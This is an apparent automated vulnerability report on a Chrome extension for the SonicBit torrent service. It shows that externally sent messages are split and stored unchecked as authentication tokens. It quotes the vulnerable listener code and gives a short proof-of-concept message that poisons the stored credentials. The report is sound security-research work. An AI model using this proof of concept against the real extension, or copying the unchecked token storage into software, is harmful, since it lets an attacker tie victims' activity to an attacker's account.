# CoCo Analysis: caeebcagcpmjhlmndepapcokebchemij

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/caeebcagcpmjhlmndepapcokebchemij/opgen_generated_files/bg.js
Line 982	var dataSplitVal = data.split("_||_");
Line 983	userToken = dataSplitVal[0];
Line 984	sessToken = dataSplitVal[1];

**Code:**

```javascript
// Background script - bg.js Lines 980-999
chrome.runtime.onMessageExternal.addListener(
  function(data, sender, sendResponse) {  // ← attacker-controlled from external message
    var dataSplitVal = data.split("_||_");
    userToken = dataSplitVal[0];  // ← attacker-controlled token
    sessToken = dataSplitVal[1];  // ← attacker-controlled session token

    chrome.tabs.remove(sender.tab.id);

    chrome.storage.sync.set({"user_token": userToken}, function() {  // ← sink 1
    });

    chrome.storage.sync.set({"session_token": sessToken}, function() {  // ← sink 2
    });

    chrome.contextMenus.update("sbwec", {"title": "Add to SonicBit", "enabled": true });

    if(userToken)
      alert("Authentication success.");
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted domain (sonicbit.net or specific extension ID):
// Send malicious authentication tokens
chrome.runtime.sendMessage(
  "caeebcagcpmjhlmndepapcokebchemij",  // Extension ID
  "fake_user_token_||_fake_session_token",  // Attacker-controlled data
  function(response) {
    console.log("Storage poisoned with fake credentials");
  }
);
```

**Impact:** Authentication token poisoning. Although manifest.json restricts externally_connectable to sonicbit.net domains and a specific extension ID (fclkpejeajbaompkgekmekaadjinleic), any of these sources can send arbitrary external messages to poison the extension's sync storage with malicious user_token and session_token values. The extension splits the data by "_||_" delimiter and blindly stores both parts as authentication credentials. Later, when the user interacts with the context menu ("Add to SonicBit"), the extension retrieves these tokens (Line 1035-1038) and uses them with the Authorization header (Line 1073: http.setRequestHeader("Authorization", "Bearer " + userToken)) to make API requests to https://weapi.sonicbit.net/api/web_extension/add_torrent_url. An attacker controlling the whitelisted domains or the companion extension could inject their own tokens, causing the victim's torrent additions to be associated with the attacker's account, or potentially exfiltrate data to an attacker-controlled account.
